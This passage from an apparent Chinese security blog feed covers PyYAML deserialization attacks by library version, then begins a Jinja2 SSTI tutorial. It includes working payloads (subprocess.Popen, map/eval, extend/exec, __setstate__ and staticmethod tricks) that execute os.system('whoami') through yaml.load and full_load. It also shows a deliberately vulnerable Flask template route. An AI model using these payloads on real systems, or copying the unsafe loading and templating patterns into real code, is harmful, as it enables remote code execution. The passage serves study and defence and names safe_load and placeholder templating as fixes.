5.1</h2><blockquote><p>默认构造器：Constructor</p><p>不支持标签：无，全部支持。</p></blockquote><p>版本小于5.1提供两个方法解析YAML：</p><ul><li><code>yaml.load</code>：加载单个YAML文件</li><li><code>yaml.load_all</code>：加载多个YAML文件</li></ul><p>两者都可以指定构造器<code>Loader</code>，此版本下构造器有三种：</p><ul><li><code>BaseConstructor</code>：基础构造器，不支持类型转换。</li><li><code>SafeConstructor</code>：集成BaseConstructor，同时类型转换和YAML规范一致，不支持<code>complex python tags</code>。</li><li><code>Constructor</code>：在YAML规范基础上新增<code>complex python tags</code>。</li></ul><p>支持complex python tags的Constructor构造器是最危险的构造器，同时<strong>它也是在此版本下默认使用的</strong>。</p><p>此版本下五种标签看情况选择即可。</p><h2 id="PyYAML-x3D-5-1"><a href="#PyYAML-x3D-5-1" class="headerlink" title="PyYAML &#x3D; 5.1"></a>PyYAML &#x3D; 5.1</h2><blockquote><p>默认构造器：FullConstructor</p><p>不支持标签：无，全部支持。</p></blockquote><p>此版本下的构造器有：</p><ul><li><code>BaseConstructor</code>：没有任何强制类型转换</li><li><code>SafeConstructor</code>：只有基础类型的强制类型转换</li><li><code>FullConstructor</code>：除了 <code>python/object/apply</code> 之外都支持，但是加载的模块必须位于 <code>sys.modules</code> 中（说明已经主动 import 过了才让加载）。这个是默认的构造器。</li><li><code>UnsafeConstructor</code>：支持全部的强制类型转换</li><li><code>Constructor</code>：等同于 <code>UnsafeConstructor</code></li></ul><p>同时，新增了几个加载方法：</p><ul><li><code>yaml.full_load</code></li><li><code>yaml.full_load_all</code></li><li><code>yaml.unsafe_load</code></li><li><code>yaml.unsafe_load_all</code></li></ul><h3 id="不使用FullConstructor"><a href="#不使用FullConstructor" class="headerlink" title="不使用FullConstructor"></a>不使用FullConstructor</h3><p>这种情况下和版本小于5.1的利用方式相同，但构造器必须是<code>UnsafeConstructor</code>、<code>Constructor</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">yaml.unsafe_load(exp)<br>yaml.load(exp, Loader=UnsafeLoader)<br></code></pre></td></tr></table></figure><h3 id="突破FullConstructor"><a href="#突破FullConstructor" class="headerlink" title="突破FullConstructor"></a>突破FullConstructor</h3><p><strong>goal：</strong>触发带参数调用+引入函数</p><p>FullConstructor只允许加载<code>sys.modules</code>中的模块，也就是import过的，总结来说利用过程中需要解决如下限制：</p><ol><li>只引用，不执行的限制：<ul><li>加载进来的 <code>module</code> 必须是位于 <code>sys.modules</code> 中</li></ul></li><li>引用并执行：<ul><li>加载进来的 <code>module</code> 必须是位于 <code>sys.modules</code> 中</li><li>FullConstructor 下，<code>unsafe = False</code>，加载进来的 <code>module.name</code> 必须是一个类</li></ul></li></ol><p>两个不行的例子：</p><ol><li><code>!!python/name:pickle.loads</code>：<code>pickle</code> 不在 <code>sys.modules</code> 中</li><li><code>!!python/object/new:builtins.eval [&quot;print(1)&quot;]</code>：<code>eval</code> 虽然在 <code>sys.modules</code> 中，但是 <code>type(builtins.eval)</code> 是 <code>builtin_function_or_method</code> 而不是一个类。</li></ol><h4 id="subprocess-Popen"><a href="#subprocess-Popen" class="headerlink" title="subprocess.Popen()"></a>subprocess.Popen()</h4><p>满足位于<code>sys.modules</code>，同时可以执行命令的类就是<code>subprocess.Popen</code>，因此使用apply标签的payload就是：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/apply:subprocess.Popen</span><br><span class="hljs-string">  - whoami</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="map"><a href="#map" class="headerlink" title="map()"></a>map()</h4><p>不使用apply标签，在builtins内置模块中还有<code>map</code>、<code>filter</code>等可以触发函数执行。类可以通过<code>python/object/new</code>引入，而函数可以通过<code>python/name</code>引入，最后的payload就是：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:tuple</span><br><span class="hljs-string">- !!python/object/new:map</span><br><span class="hljs-string">  - !!python/name:eval</span><br><span class="hljs-string">  - [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="listitems-extend"><a href="#listitems-extend" class="headerlink" title="listitems.extend()"></a>listitems.extend()</h4><p>使用<code>FullConstructor</code>加载YAML的同时，会调用<code>construct_python_object_apply</code>，而它不仅进行了实例化，如果有<code>listitems</code>还会调用实例中的<code>extend</code>属性指定的方法，比如：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">exp = <span class="hljs-built_in">type</span>(<span class="hljs-string">&quot;exp&quot;</span>, (), &#123;<span class="hljs-string">&quot;extend&quot;</span>: <span class="hljs-built_in">eval</span>&#125;)<br>exp.extend(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<br></code></pre></td></tr></table></figure><p>因此转换成YAML就是：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.full_load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:type</span><br><span class="hljs-string">args:</span><br><span class="hljs-string">  - exp</span><br><span class="hljs-string">  - !!python/tuple []</span><br><span class="hljs-string">  - &#123;&quot;extend&quot;: !!python/name:exec &#125;</span><br><span class="hljs-string">listitems: &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="setstate-state"><a href="#setstate-state" class="headerlink" title="__setstate__(state)"></a>__setstate__(state)</h4><p>除了<code>extend</code>，<code>construct_python_object_apply</code>还会调用<code>setstate</code>，对于这个利用方式picke反序列化中已经提到：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">exp = <span class="hljs-built_in">type</span>(<span class="hljs-string">&quot;exp&quot;</span>, (<span class="hljs-built_in">list</span>, ), &#123;<span class="hljs-string">&quot;__setstate__&quot;</span>: <span class="hljs-built_in">eval</span>&#125;)<br>exp.__setstate__(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<br></code></pre></td></tr></table></figure><p>转换成YAML：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.full_load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:type</span><br><span class="hljs-string">args:</span><br><span class="hljs-string">  - exp</span><br><span class="hljs-string">  - !!python/tuple []</span><br><span class="hljs-string">  - &#123;&quot;__setstate__&quot;: !!python/name:eval &#125;</span><br><span class="hljs-string">state: &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="slotstate-update"><a href="#slotstate-update" class="headerlink" title="slotstate.update()"></a>slotstate.update()</h4><p><code>type</code>可以用 <code>staticmethod</code> 来替换，<code>set_python_instance_state</code> 中存在调用：<code>slotstate.update()</code>，只需要将<code>slotstate.update</code> 赋值为 <code>eval</code>，<code>state</code>赋值为payload即可：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py">exp = <span class="hljs-built_in">staticmethod</span>([<span class="hljs-number">0</span>])<br>exp.__dict__.update(<br>    &#123;<span class="hljs-string">&quot;update&quot;</span>: <span class="hljs-built_in">eval</span>, <span class="hljs-string">&quot;items&quot;</span>: <span class="hljs-built_in">list</span>&#125;<br>)<br>exp_raise = <span class="hljs-built_in">str</span>()<br><span class="hljs-comment"># 由于 str 没有 __dict__ 方法，所以在 PyYAML 解析时会触发下面调用</span><br><br>exp.update(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<br></code></pre></td></tr></table></figure><p>转换成YAML就是：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py">yaml.full_load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:str</span><br><span class="hljs-string">    args: []</span><br><span class="hljs-string">    # 通过 state 触发调用</span><br><span class="hljs-string">    state: !!python/tuple</span><br><span class="hljs-string">      - &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span><br><span class="hljs-string">      # 下面构造 exp</span><br><span class="hljs-string">      - !!python/object/new:staticmethod</span><br><span class="hljs-string">        args: []</span><br><span class="hljs-string">        state: </span><br><span class="hljs-string">          update: !!python/name:eval</span><br><span class="hljs-string">          items: !!python/name:list  # 不设置这个也可以，会报错但也已经执行成功</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="PyYAML-x3D-5-2"><a href="#PyYAML-x3D-5-2" class="headerlink" title="PyYAML &#x3D; 5.2"></a>PyYAML &#x3D; 5.2</h2><blockquote><p>默认构造器：FullConstructor</p><p>不支持标签：python&#x2F;object&#x2F;apply</p></blockquote><h2 id="PyYAML-x3D-5-3-1"><a href="#PyYAML-x3D-5-3-1" class="headerlink" title="PyYAML &#x3D; 5.3.1"></a>PyYAML &#x3D; 5.3.1</h2><blockquote><p>默认构造器：FullConstructor</p><p>不支持标签：python&#x2F;object&#x2F;apply</p></blockquote><p>此版本打了个补丁，禁止在使用<code>set_python_instance_state</code>方法时设置任意属性，设置黑名单过滤了<code>extend</code>以及<code>__xxx__</code>方法，详见<a href="https://github.com/yaml/pyyaml/pull/386">issue</a>。</p><blockquote><p>​This patch tries to block such attacks in FullLoader by preventing <code>set_python_instance_state</code> from setting arbitrary properties. It implements a blacklist that includes <code>extend</code> method (called by construct_python_object_apply) and all special methods (e.g. <code>__set__</code>,<code>__setitem__</code>, etc.).</p><p>FROM <a href="https://github.com/yaml/pyyaml/pull/386/files#diff-778c6b991749c6ca88cbbb56467e23500e874edb53c9bcc7d1e54a54ca1e10a2">lib&#x2F;yaml&#x2F;constructor.py</a>：</p><p>​<code>blacklist_regex = [&#39;^extend$&#39;, &#39;^__.*__$&#39;]</code></p></blockquote><h2 id="PyYAML-x3D-5-4"><a href="#PyYAML-x3D-5-4" class="headerlink" title="PyYAML &#x3D; 5.4"></a>PyYAML &#x3D; 5.4</h2><blockquote><p>默认构造器：FullConstructor</p><p>不支持标签：python&#x2F;object&#x2F;apply、python&#x2F;object、python&#x2F;object&#x2F;new、python&#x2F;module</p><p>仅支持：python&#x2F;name</p></blockquote><h2 id="PyYAML-x3D-6-0"><a href="#PyYAML-x3D-6-0" class="headerlink" title="PyYAML &#x3D; 6.0"></a>PyYAML &#x3D; 6.0</h2><blockquote><p>默认构造器：无默认构造器，使用<code>yaml.load()</code>时必须指定参数Loader。</p><p>不支持标签：python&#x2F;object&#x2F;apply、python&#x2F;object、python&#x2F;object&#x2F;new、python&#x2F;module</p><p>仅支持：python&#x2F;name</p></blockquote><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>使用<code>yaml.safe_load()</code>即可。</p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="YAML语法"><a href="#YAML语法" class="headerlink" title="YAML语法"></a>YAML语法</h2><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><ul><li>大小写敏感</li><li>使用缩进表示层级关系</li><li>缩进不允许使用tab，只允许空格</li><li>缩进的空格数不重要，只要相同层级的元素左对齐即可</li><li>‘#’表示注释</li></ul><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>注意 <code>:</code>、<code>?</code>、<code>-</code>后面<strong>都需要跟一个空格。</strong></p><ul><li><p>对象：键值对的集合，又称为映射（mapping）&#x2F; 哈希（hashes） &#x2F; 字典（dictionary）</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment">#一般对象，包含属性，以键值对表示</span><br><span class="hljs-attr">obj:</span> <br>    <span class="hljs-attr">key1:</span> <span class="hljs-string">value</span><br>    <span class="hljs-attr">key2:</span> <span class="hljs-string">value2</span><br><span class="hljs-comment">#复杂对象，键名可以是一个数组，值也是数组</span><br><span class="hljs-string">?</span>  <br>    <span class="hljs-bullet">-</span> <span class="hljs-string">complexkey1</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">complexkey2</span><br><span class="hljs-string">:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">complexvalue1</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">complexvalue2</span><br>    <span class="hljs-comment"># [complexkey1,complexkey2] =&gt; [complexvalue1,complexvalue2]</span><br></code></pre></td></tr></table></figure></li><li><p>数组：一组按次序排列的值，又称为序列（sequence） &#x2F; 列表（list）</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment">#以 - 开头表示是一个数组</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">A</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">B</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">C</span><br><span class="hljs-comment">#对象数组</span><br><span class="hljs-attr">companies:</span><br>    <span class="hljs-bullet">-</span><br>        <span class="hljs-attr">id:</span> <span class="hljs-number">1</span><br>        <span class="hljs-attr">name:</span> <span class="hljs-string">company1</span><br>        <span class="hljs-attr">price:</span> <span class="hljs-string">200W</span><br>    <span class="hljs-bullet">-</span><br>        <span class="hljs-attr">id:</span> <span class="hljs-number">2</span><br>        <span class="hljs-attr">name:</span> <span class="hljs-string">company2</span><br>        <span class="hljs-attr">price:</span> <span class="hljs-string">500W</span><br>        <span class="hljs-comment">#companies: [&#123;id: 1,name: company1,price: 200W&#125;,&#123;id: 2,name: company2,price: 500W&#125;]</span><br><span class="hljs-comment">#复合结构，对象包含多类型属性</span><br></code></pre></td></tr></table></figure></li><li><p>纯量（scalars）：单个的、不可再分的值</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">boolean:</span> <br>    <span class="hljs-bullet">-</span> <span class="hljs-literal">TRUE</span>  <span class="hljs-comment">#true,True都可以</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-literal">FALSE</span>  <span class="hljs-comment">#false，False都可以</span><br><span class="hljs-attr">float:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-number">3.14</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-number">6.8523015e+5</span>  <span class="hljs-comment">#可以使用科学计数法</span><br><span class="hljs-attr">int:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-number">123</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">0b1010_0111_0100_1010_1110</span>    <span class="hljs-comment">#二进制表示</span><br><span class="hljs-attr">null:</span><br>    <span class="hljs-attr">nodeName:</span> <span class="hljs-string">&#x27;node&#x27;</span><br>    <span class="hljs-attr">parent:</span> <span class="hljs-string">~</span>  <span class="hljs-comment">#使用~表示null</span><br><span class="hljs-attr">string:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">哈哈</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;Hello world&#x27;</span>  <span class="hljs-comment">#可以使用双引号或者单引号包裹特殊字符</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">newline</span><br>      <span class="hljs-string">newline2</span>    <span class="hljs-comment">#字符串可以拆成多行，每一行会被转化成一个空格</span><br><span class="hljs-attr">date:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-number">2018-02-17</span>    <span class="hljs-comment">#日期必须使用ISO 8601格式，即yyyy-MM-dd</span><br><span class="hljs-attr">datetime:</span> <br>    <span class="hljs-bullet">-</span>  <span class="hljs-number">2018-02-17T15:02:31+08:00</span>    <span class="hljs-comment">#时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># &amp; 用来建立锚点（defaults），&lt;&lt; 表示合并到当前数据，* 用来引用锚点</span><br><span class="hljs-attr">defaults:</span> <span class="hljs-meta">&amp;defaults</span><br>  <span class="hljs-attr">adapter:</span>  <span class="hljs-string">postgres</span><br>  <span class="hljs-attr">host:</span>     <span class="hljs-string">localhost</span><br><span class="hljs-attr">test:</span><br>  <span class="hljs-attr">database:</span> <span class="hljs-string">myapp_test</span><br>  <span class="hljs-string">&lt;&lt;:</span> <span class="hljs-meta">*defaults</span><br> <br><span class="hljs-comment">#相当于：</span><br><br><span class="hljs-attr">defaults:</span><br>  <span class="hljs-attr">adapter:</span>  <span class="hljs-string">postgres</span><br>  <span class="hljs-attr">host:</span>     <span class="hljs-string">localhost</span><br><span class="hljs-attr">test:</span><br>  <span class="hljs-attr">database:</span> <span class="hljs-string">myapp_test</span><br>  <span class="hljs-attr">adapter:</span>  <span class="hljs-string">postgres</span><br>  <span class="hljs-attr">host:</span>     <span class="hljs-string">localhost</span><br>  <br></code></pre></td></tr></table></figure><h1 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h1><p><a href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/">SecMap - 反序列化（PyYAML） - Tr0y’s Blog</a></p><p><a href="https://boogipop.com/2023/03/02/PyYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">https://boogipop.com/2023/03/02/PyYAML反序列化</a></p><p><a href="https://pyyaml.org/wiki/PyYAMLDocumentation">https://pyyaml.org/wiki/PyYAMLDocumentation</a></p>]]></content>
    
    
    <categories>
      
      <category>python安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PyYaml</tag>
      
      <tag>python安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python SSTI</title>
    <link href="/2023/05/09/python%20SSTI/"/>
    <url>/2023/05/09/python%20SSTI/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>SSTI全称是<code>Server-Side-Template-Injection</code>(服务器端模板引擎注入)，所谓模板就是用于将后端数据(变量)转变为前端的视觉表现(HTML代码)的一种手段，使用模板引擎可以使网站程序实现界面与数据的分离。常见的模板：</p><ul><li><strong>python</strong>：jinja2、mako、tornado、django</li><li><strong>php</strong>：smarty、twig</li><li><strong>java</strong>：jade、velocity、springboot-Thymeleaf</li></ul><p>一个简单的demo，使用flask中的jinja2进行模板渲染，结构如下：</p><blockquote><p>flaskdemo&#x2F;<br>├── app.py<br>├── static<br>└── templates<br>    └── index.html</p></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#app.py</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request<br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>,name = request.args.get(<span class="hljs-string">&quot;name&quot;</span>))<br>    <br>app.run()<br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- index.html --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span><br>            My name is &#123;&#123;name&#125;&#125;<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>运行app.py，访问<code>http://localhost:5000/index?name=alice</code>即可得到页面<code>My name is alice</code>，这就是一次简单且安全的模板渲染。</p><p>本文重点学习jinja2 SSTI。</p><h1 id="漏洞成因与防御"><a href="#漏洞成因与防御" class="headerlink" title="漏洞成因与防御"></a>漏洞成因与防御</h1><h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>漏洞成因就是代码的不规范，直接在html插入字符如使用占位符，导致注入攻击，下面给出一段漏洞路由：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/ssti&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ssti</span>():<br>    template =<span class="hljs-string">&#x27;&#x27;&#x27;&lt;html&gt;</span><br><span class="hljs-string">    &lt;body&gt;</span><br><span class="hljs-string">        &lt;h1&gt;</span><br><span class="hljs-string">            My name is %s</span><br><span class="hljs-string">        &lt;/h1&gt;</span><br><span class="hljs-string">    &lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;&#x27;&#x27;&#x27;</span>%request.args[<span class="hljs-string">&#x27;name&#x27;</span>]<br>    <span class="hljs-keyword">return</span> render_template_string(template)<br></code></pre></td></tr></table></figure><p>可以看到，代码直接把参数name替换进了html源码中，此时我们使用模板引擎可解析的代码闭合符如<code>&#123;&#123;expr&#125;&#125;</code>，插入代码即可实现模板注入。</p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>防御方式也很简单，避免使用格式化字符串，使用更安全的<code>&#123;&#123;&#125;&#125;</code>进行字符替换，例如：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs py">render_template_string(<span class="hljs-string">&#x27;&#123;&#123;name&#125;&#125;&#x27;</span>,name=<span class="hljs-string">&#x27;alice&#x27;</span>)<br>render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>,name=<span class="hljs-string">&#x27;alice&#x27;</span>) <br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;!-- index.html --&gt;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">    &lt;body&gt;</span><br><span class="hljs-string">        &lt;h1&gt;</span><br><span class="hljs-string">            My name is &#123;&#123;name&#125;&#125;</span><br><span class="hljs-string">        &lt;/h1&gt;</span><br><span class="hljs-string">    &lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><h2 id="1-直接注入"><a href="#1-直接注入" class="headerlink" title="1.直接注入"></a>1.直接注入</h2><p>针对于</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">render_template_string(<span class="hljs-string">&#x27;name is :%s&#x27;</span> %request.args[<span class="hljs-string">&#x27;name&#x27;</span>])<br></code></pre></td></tr></table></figure><p>可以直接传递参数注入。</p><h2 id="2-间接注入"><a href="#2-间接注入" class="headerlink" title="2.间接注入"></a>2.间接注入</h2><p>针对于</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>,name=<span class="hljs-string">&#x27;alice&#x27;</span>) <br></code></pre></td></tr></table></figure><p>需要配合其它漏洞，如网鼎杯初赛web669中使用的利用<code>zipslip</code>压缩文档路径穿越漏洞，实现文件覆盖，在伪造的html中插入SSTI payload并覆盖index.html文件，最后通过渲染html实现rce。</p><h2 id="3-jinja2语法"><a href="#3-jinja2语法" class="headerlink" title="3.jinja2语法"></a>3.jinja2语法</h2><h3 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h3><ol><li>控制结构 <code>&#123;% %&#125;</code>，也可以用来声明变量（<code>&#123;% set c = "1" %&#125;</code>）</li><li>变量取值 <code>&#123;&#123; &#125;&#125;</code>，比如输入<code>7*7</code> ，或者是字符串、调用对象的方法，都会渲染出执行的结果</li><li>注释 &#96;&#96;</li></ol><p>从别人博客里找了一个例子，有助于理解：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Template<br><br>tp = Template(<span class="hljs-string">&#x27;&#x27;&#x27;&#123;#</span><br><span class="hljs-string">这是一个注释</span><br><span class="hljs-string">#&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#123;% set c = [5, 6, 7, 8, 9] %&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#123;% for i in a+c %&#125;</span><br><span class="hljs-string">    &#123;% if i % 2 %&#125; &#123;&#123; i &#125;&#125; &#123;% endif %&#125;</span><br><span class="hljs-string">&#123;% endfor %&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(tp.render(a = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]))<br></code></pre></td></tr></table></figure><h3 id="特殊语法"><a href="#特殊语法" class="headerlink" title="特殊语法"></a>特殊语法</h3><h4 